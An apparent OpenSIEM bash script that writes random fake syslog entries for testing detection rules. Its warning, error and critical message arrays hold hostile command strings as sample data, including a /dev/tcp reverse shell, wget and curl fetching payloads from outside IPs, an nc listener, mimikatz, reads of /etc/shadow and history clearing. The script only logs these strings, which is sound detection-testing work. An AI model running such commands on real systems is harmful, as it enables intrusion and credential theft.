#!/bin/bash
# OpenSIEM - GPL-3.0 Licensed
# Copyright (c) 2024–present
# See LICENSE for details.
# =============================================================================
# OpenSIEM — Random Log Generator
#
# Generates random logs with various severity levels (info, warning, error, critical)
# using the logger command. Useful for testing SIEM rules and alerting.
#
# Usage:
#   ./generate_logs.sh                    # Generate 10 logs (default)
#   ./generate_logs.sh -n 50              # Generate 50 logs
#   ./generate_logs.sh -c                 # Continuous mode (Ctrl+C to stop)
#   ./generate_logs.sh -s 2               # Generate logs every 2 seconds
#   ./generate_logs.sh -t "myapp"         # Use custom tag
# =============================================================================

set -euo pipefail

# Default values
NUM_LOGS=10
CONTINUOUS=false
INTERVAL=1
TAG="opensiem-test"
SYSLOG_FACILITY="user"  # user, local0, local1, etc.

# Colors for output
RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
BLU='\033[0;34m'
MAG='\033[0;35m'
CYN='\033[0;36m'
NC='\033[0m'

# Help function
show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
    -n NUM      Number of logs to generate (default: 10)
    -c          Continuous mode - generate logs forever (Ctrl+C to stop)
    -s SECONDS  Sleep interval between logs in continuous mode (default: 1)
    -t TAG      Custom syslog tag (default: opensiem-test)
    -f FACILITY Syslog facility (default: user)
    -h          Show this help message

Examples:
    $0 -n 20                    # Generate 20 random logs
    $0 -c                       # Generate logs continuously
    $0 -c -s 2                  # Generate a log every 2 seconds
    $0 -t "myapp" -n 50         # Use custom tag and generate 50 logs
    $0 -f local0 -c             # Use local0 facility in continuous mode
EOF
    exit 0
}

# Parse command line arguments
while getopts "n:cs:t:f:h" opt; do
    case $opt in
        n) NUM_LOGS="$OPTARG" ;;
        c) CONTINUOUS=true ;;
        s) INTERVAL="$OPTARG" ;;
        t) TAG="$OPTARG" ;;
        f) SYSLOG_FACILITY="$OPTARG" ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

# Validate numeric arguments
if ! [[ "$NUM_LOGS" =~ ^[0-9]+$ ]] || [ "$NUM_LOGS" -lt 1 ]; then
    echo "Error: NUM_LOGS must be a positive integer" >&2
    exit 1
fi

if ! [[ "$INTERVAL" =~ ^[0-9]+(\.[0-9]+)?$ ]] || [ "$(echo "$INTERVAL <= 0" | bc)" -eq 1 ]; then
    echo "Error: INTERVAL must be a positive number" >&2
    exit 1
fi

# Arrays of random log messages for different severities
declare -A INFO_MESSAGES=(
    [0]="User authentication successful for user admin from 192.168.1.10"
    [1]="Database connection established to museum on 127.0.0.1"
    [2]="Scheduled job completed: backup finished 512MB written"
    [3]="Configuration file /etc/opensiem/opensiem.conf loaded"
    [4]="Service rsyslog started successfully"
    [5]="API endpoint called: /api/v1/status 200 OK"
    [6]="New session created for user john.doe pid=4521"
    [7]="Health check passed: all 4 services running"
    [8]="SSH connection closed from 192.168.1.50 port 54123"
    [9]="nohup process monitoring started by www-data"
)

declare -A WARNING_MESSAGES=(
    [0]="authentication failure; rhost=192.168.1.77 user=root repeated 5 times"
    [1]="DROP TABLE attempted on database museum by user webapp"
    [2]="invalid user guest from 10.0.0.55 port 51234 ssh2"
    [3]="192.168.1.88 GET /wp-config.php HTTP/1.1 403 512 python-requests/2.28"
    [4]="Connection closed by authenticating user admin 192.168.1.99 port 22"
    [5]="nmap scan detected: SYN probe from 192.168.1.77 to port 22,80,443"
    [6]="TRUNCATE TABLE users attempted via SQL injection probe"
    [7]="process /tmp/updater.sh run with /dev/null 2>&1 redirect by www-data"
    [8]="sqlmap detected: GET /api/search?id=1%27 HTTP/1.1 500 from 192.168.1.99"
    [9]="zgrab2 scan: TCP SYN to port 443 from 10.0.0.77 User-Agent: zgrab/0.x"
)

declare -A ERROR_MESSAGES=(
    [0]="POSTGRESQL ERROR: syntax error at or near DROP at character 1 in query"
    [1]="SSH login failed: user=root method=password from=185.220.101.5:54321"
    [2]="password authentication failed for user wp_user from host 192.168.2.30"
    [3]="AppArmor DENIED op=open profile=snap.firefox name=/proc/mem pid=1234"
    [4]="kernel: audit: type=SYSCALL exe=/bin/bash comm=bash uid=1000 COMMAND=/bin/bash"
    [5]="nc -lvp 4444 listener spawned by uid=1000 exe=/usr/bin/nc"
    [6]="SELinux AVC DENIED: read write on file stype=httpd_t ttype=shadow_t"
    [7]="OOM killer killed PID 9876 (firefox) score 500 total-vm:1234567kB"
    [8]="UFW BLOCK IN=eth0 SRC=45.33.32.156 DST=192.168.1.1 PROTO=TCP DPT=4444"
    [9]="history -c executed by user john.doe; unset HISTFILE"
)

declare -A CRITICAL_MESSAGES=(
    [0]="kernel: audit: type=EXECVE argc=3 a0=bash a1=-c a2=/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1"
    [1]="sysmon: ProcessCreate image=mimikatz.exe commandline=mimikatz privilege::debug"
    [2]="kernel: audit: type=SYSCALL exe=/bin/cat comm=cat name=/etc/shadow uid=1000"
    [3]="wget -O /tmp/implant http://194.165.16.11/payload executed by www-data"
    [4]="UFW BLOCK OUT=eth0 SRC=192.168.1.5 DST=185.220.101.5 PROTO=TCP DPT=443"
    [5]="meterpreter stage payload detected: TCP 185.220.101.5:4444 -> 192.168.1.100"
    [6]="chmod +x /tmp/update.sh executed via kernel audit SYSCALL uid=1000"
    [7]="curl -o /tmp/exec http://194.165.16.11/stage2 run by pid=6789"
    [8]="eval(base64_decode POST /images/cmd.php HTTP/1.1 200 from 192.168.1.55"
    [9]="cat /etc/passwd > /tmp/out; echo root: | chpasswd attempted by uid=0"
)

# Additional random data for more realistic logs
USERNAMES=("john.doe" "jane.smith" "admin" "api-user" "monitoring" "alice" "bob" "root" "www-data" "postgres")
IPS=("192.168.1.100" "10.0.0.50" "172.31.0.10" "203.0.113.5" "198.51.100.23" "192.168.1.1" "10.0.0.1" "8.8.8.8")
ENDPOINTS=("/api/login" "/api/data" "/health" "/metrics" "/api/users" "/api/config" "/api/search")
STATUS_CODES=("200" "201" "400" "401" "403" "404" "500" "502" "503")

# Helper function to get random element from array
random_element() {
    local array=("${!1}")
    echo "${array[$((RANDOM % ${#array[@]}))]}"
}

# Helper function to generate random IP with realistic formatting
random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

# Helper function to generate random timestamp
random_timestamp() {
    date -d "@$((RANDOM % 1000000000 + 1600000000))" "+%Y-%m-%d %H:%M:%S" 2>/dev/null || date "+%Y-%m-%d %H:%M:%S"
}

# Function to generate a random log based on severity
generate_log() {
    local severity="$1"
    local message=""
    local log_level=""
    
    case $severity in
        "info")
            message=$(random_element INFO_MESSAGES[@])
            # Enhance with random data
            if [[ $((RANDOM % 2)) -eq 0 ]]; then
                message="$message [user: $(random_element USERNAMES[@])]"
            fi
            log_level="info"
            color=$BLU
            ;;
        "warning")
            message=$(random_element WARNING_MESSAGES[@])
            # Enhance with random data
            message="$message [threshold: $((RANDOM % 100))%]"
            log_level="warning"
            color=$YLW
            ;;
        "error")
            message=$(random_element ERROR_MESSAGES[@])
            # Enhance with random data
            if [[ $((RANDOM % 2)) -eq 0 ]]; then
                message="$message [ip: $(random_element IPS[@])]"
            fi
            log_level="err"
            color=$RED
            ;;
        "critical")
            message=$(random_element CRITICAL_MESSAGES[@])
            # Enhance with random data
            message="$message [severity: CRITICAL]"
            log_level="crit"
            color=$MAG
            ;;
    esac
    
    # Add more realism with HTTP request patterns sometimes
    if [[ $((RANDOM % 3)) -eq 0 ]] && [[ "$severity" != "critical" ]]; then
        endpoint=$(random_element ENDPOINTS[@])
        status=$(random_element STATUS_CODES[@])
        ip=$(random_ip)
        message="$message - HTTP $ip - - [$endpoint] $status"
    fi
    
    # Use logger command with appropriate priority
    # Format: facility.severity (e.g., user.info, user.warning, etc.)
    logger -t "$TAG" -p "${SYSLOG_FACILITY}.${log_level}" "$message"
    
    # Also print to stdout with color for visibility
    echo -e "${color}[$(date '+%Y-%m-%d %H:%M:%S')] [${severity^^}] ${TAG}: ${message}${NC}"
}

# Function to get random severity with weighted distribution
random_severity() {
    local rand=$((RANDOM % 100))
    if [ $rand -lt 40 ]; then
        echo "info"      # 40% info
    elif [ $rand -lt 65 ]; then
        echo "warning"   # 25% warning
    elif [ $rand -lt 85 ]; then
        echo "error"     # 20% error
    else
        echo "critical"  # 15% critical
    fi
}

# Function to generate logs with specific severity distribution
generate_log_with_distribution() {
    local severity=$(random_severity)
    generate_log "$severity"
}

# Print header
echo -e "${CYN}════════════════════════════════════════════════════════════${NC}"
echo -e "${CYN}     OpenSIEM Random Log Generator - Starting...            ${NC}"
echo -e "${CYN}════════════════════════════════════════════════════════════${NC}"
echo -e "Tag: ${GRN}$TAG${NC}"
echo -e "Facility: ${GRN}$SYSLOG_FACILITY${NC}"
echo -e "Syslog destination: ${GRN}/var/log/syslog or /var/log/messages${NC}"
echo -e "${CYN}════════════════════════════════════════════════════════════${NC}"
echo ""

# Main loop
if [ "$CONTINUOUS" = true ]; then
    echo -e "${YLW}Continuous mode enabled. Press Ctrl+C to stop.${NC}"
    echo -e "${YLW}Generating log every ${INTERVAL} second(s)...${NC}\n"
    
    trap 'echo -e "\n${YLW}Stopping log generation...${NC}"; exit 0' INT TERM
    
    while true; do
        generate_log_with_distribution
        sleep "$INTERVAL"
    done
else
    echo -e "${YLW}Generating $NUM_LOGS random logs...${NC}\n"
    
    for i in $(seq 1 "$NUM_LOGS"); do
        generate_log_with_distribution
        if [ $i -lt "$NUM_LOGS" ]; then
            sleep 0.1  # Small delay to avoid overwhelming syslog
        fi
    done
    
    echo -e "\n${GRN}✓ Generated $NUM_LOGS logs successfully.${NC}"
    echo -e "${GRN}  Check syslog with: tail -f /var/log/syslog | grep $TAG${NC}"
fi
